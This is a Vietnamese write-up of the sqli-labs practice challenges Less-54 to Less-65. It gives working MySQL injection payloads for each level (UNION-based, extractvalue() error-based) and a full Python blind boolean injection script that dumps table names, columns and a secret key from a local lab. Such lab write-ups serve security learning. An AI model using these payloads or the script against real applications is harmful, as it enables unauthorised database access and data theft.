# sql-labs (Challenges)

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-54](#Less-54)
- [Less-55](#Less-55)
- [Less-56](#Less-56)
- [Less-57](#Less-57)
- [Less-58](#Less-58)
- [Less-59](#Less-59)
- [Less-60](#Less-60)
- [Less-61](#Less-61)
- [Less-62](#Less-62)
- [Less-63](#Less-63)
- [Less-64](#Less-64)
- [Less-65](#Less-65)

## Less-54

Source code tại [đây](https://github.com/Audi-1/sqli-labs/blob/master/Less-54/index.php).

Như trong mô tả của challenge:

 `The objective of this challenge is to dump the **(secret key)** from only random table from Database ***('CHALLENGES')\*** in Less than 10 attempts
For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.`

Mục tiêu của chall này là tìm ra `secret key` từ table trong database `challenges` trong 10 lần thử, và các tables đều được random sau mỗi lần reset.

Đây là câu query của chall:

```mysql
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
```

Trước tiên, chúng ta đã biết tên database là `challenges`, nên việc đầu tiên là leak ra tất cả các table trong `challenges`.

Payload: `?id=0%27+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-54_1.png?raw=true)

Sau khi có được tên table, mình tiếp tục leak các cột có trong table `6N9Y9FYKST`.

Payload: `?id=0%27+union+select+1,2,group_concat(+column_name+)+from+information_schema.columns+where+table_name="6N9Y9FYKST"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-54_2.png?raw=true)

Ở đây gồm 4 cột gồm: `id,sessid,secret_EHKV,tryy`. 

Secret key chắc nằm trong cột `secret_EHKV`, mình leak ra thôi.

Payload: `?id=0%27+union+select+1,2,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(challenges.6N9Y9FYKST)WHERE(@x)IN(@x:=CONCAT(0x20,@x,secret_EHKV,0x3c62723e))))x)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-54_3.png?raw=true)

Ban đầu mình sử dụng payload này: `0%27+union+select+1,2,group_concat(secret_EHKV) from challenges.6N9Y9FYKST--+`, nhưng không hiểu sao nó không in ra kết quả.

## Less-55

```mysql
SELECT * FROM security.users WHERE id=($id) LIMIT 0,1
```

Tương tự câu 54.

Leak tên table:

`?id=0)+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-55_1.png?raw=true)

Leak tên column:

`?id=0)+union+select+1,2,group_concat(+column_name+)+from+information_schema.columns+where+table_name="PRY8J6L2PA"--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-55_2.png?raw=true)

Cuối cùng là tìm secret key

`?id=0)+union+select+1,2,(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(challenges.PRY8J6L2PA)WHERE(@x)IN(@x:=CONCAT(0x20,@x,secret_G2DM,0x3c62723e))))x)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-55_3.png?raw=true)

## Less-56

```mysql
SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1
```

Tương tự câu 54,55.

`?id=0%27)+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

## Less-57

```mysql
$id= '"'.$id.'"';
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

Tương tự các câu trên.

`?id=0"+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`

## Less-58

```mysql
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
```

Trong câu này, chúng ta không như thể sử dụng payload các câu trước để bypass được, nhưng hàm `mysql_error()` sẽ được in ra khi câu query lỗi, lần này mình sử dụng `extractvalue()`.

Payload: `?id=0%27 and extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_1.png?raw=true)

Payload leak các table: `?id=0%27%20and%20extractvalue(0x0a,concat(0x0a,(SELECT+group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges")))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_2.png?raw=true)

Payload leak các cột: `?id=0%27%20and%20extractvalue(0x0a,concat(0x0a,(SELECT+group_concat(+column_name+)+from+information_schema.columns+where+table_name="1JUAF684JW")))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_3.png?raw=true)

Payload dump secret key, lần này thì được :joy: còn câu 54 xài không được. :magic:

`?id=0%27%20and%20extractvalue(0x0a,concat(0x0a,(SELECT+group_concat(secret_3MGY)%20from%20challenges.1JUAF684JW)))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-58_4.png?raw=true)

## Less-59

```mysql
SELECT * FROM security.users WHERE id=$id LIMIT 0,1
```

Câu này cũng dựa vào lỗi trả về `mysql_error()`, sử dụng `extractvalue()` như câu 58.

Payload: `?id=0%20and%20extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-59.png?raw=true)

## Less-60

```mysql
$id = '("'.$id.'")';
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

Câu này cũng tương tự 2 câu trên, tận dụng hàm `mysql_error()` được in ra, sử dụng `extractvalue()`.

Sử dụng `")` để escape và inject câu query.

Payload: `?id=0")%20and%20extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-60.png?raw=true)

## Less-61

```mysql
SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1
```

Tương tự câu trên. Sử dụng `'))` để escape và inject câu query.

`0%27))%20and%20extractvalue(0x0a,concat(0x0a,(select+database())))--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-61.png?raw=true)

## Less-62

```mysql
SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1
```

Trong câu này, kết quả sẽ không trả về lỗi nữa, mà chỉ trả về `True` khi câu query đúng như hình dưới.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-62_1.png?raw=true)

Còn đây là kết quả khi lỗi.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-62_2.png?raw=true)

__Idea__

Về cơ bản, câu này khá giống với câu 8 thuộc dạng `Blind`, dựa vào kết quả là `True` hay `False` để leak ra database, table, column...

Vẫn sử dụng `left()` để đoán các kí tự và sử dụng `length()` để tìm độ dài của table, column...

[Script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-62.py)

```python
import requests
import string
import sys

def get_length(url, comment):
    s = requests.Session()
    for i in range(24, 1, -1):
        r = s.get(url + str(i) + comment).text
        # print(url + str(i) + comment)
        if 'Your Password' in r:
            return i


def send(url):
    s = requests.Session()
    r = s.get(url).text
    if 'Your Password' in r:
        return True
    else:
        return False


alphabet = string.ascii_uppercase + '_0123456789'
url = "http://localhost/Less-62/?id=1') and "

table_part1 = "left((select table_name FROM information_schema.tables where table_schema='challenges'),"
table_part2 = ")='"
comment = '--+'
length_table = "length((select table_name FROM information_schema.tables where table_schema='challenges'))="
count = 1
result = ""
tables = ""
data = ""
columns = []


length = get_length(url + length_table, comment)
for j in range(length):
    for c in alphabet:
        final_url = url + table_part1 + str(count) + table_part2 + (result+c) + "'" + comment
        # print(final_url)
        if send(final_url):
            count += 1
            result += c
            sys.stdout.write(c)
            sys.stdout.flush()
            # print (result)

# print(result)
sys.stdout.write("\r\n")
sys.stdout.flush()
tables = result
result = ""
count = 1

column_part1 = 'left((select column_name from information_schema.columns where table_name="{}" limit '.format(tables)
column_part2 = ',1),'
column_part3 = ')="'
length_column_part1 = 'length((select column_name from information_schema.columns where table_name="{}" limit '.format(tables)
length_column_part2 = ',1))='
for i in range(0, 4):
    length = get_length(url + length_column_part1 + str(i) + length_column_part2, comment)
    for j in range(length):
        for c in alphabet:
            final_url = url + column_part1 + str(i) + column_part2 + str(count) + column_part3 + (result+c) + '"' + comment
            if send(final_url):
                count += 1
                result += c
                sys.stdout.write(c)
                sys.stdout.flush()

    sys.stdout.write("\r\n")
    sys.stdout.flush()
    columns.append(result)
    result = ""
    count = 1
dump_secret_key_part1 = 'left((select {} from challenges.{}),'.format(columns[2], tables)
dump_secret_key_part2 = ')="'
length_data = 'length((select {} from challenges.{}))='.format(columns[2].replace('SECRET','secret'), tables)

length_secret_key = get_length(url + length_data, comment)
for j in range(length_secret_key):
    for c in alphabet:
        final = url + dump_secret_key_part1 + str(count) + dump_secret_key_part2 + (result+c) + '"' + comment
        if send(final):
            count += 1
            result += c
            sys.stdout.write(c)
            sys.stdout.flush()
# print(result)
sys.stdout.write("\r\n")
sys.stdout.flush()
data = result
result = ""
count = 1


print("[+] Table: {}".format(tables))
print("[+] Column: {}".format(columns))
print("[+] Secret key: {}".format(data))
```

## Less-63

```mysql
SELECT * FROM security.users WHERE id='$id' LIMIT 0,1
```

Tương tự câu 62, khác câu query nên chỉ cần sửa code lại một chút là chạy được. [script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-63.py)

## Less-64

```mysql
SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1
```

Tương tự câu 62. [script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-64.py).

## Less-65

```mysql
SELECT * FROM security.users WHERE id=($id) LIMIT 0,1
```

Tương tự câu 62. [script.py](https://github.com/n9uyen/sqli-labs/blob/master/scripts/Less-65.py).
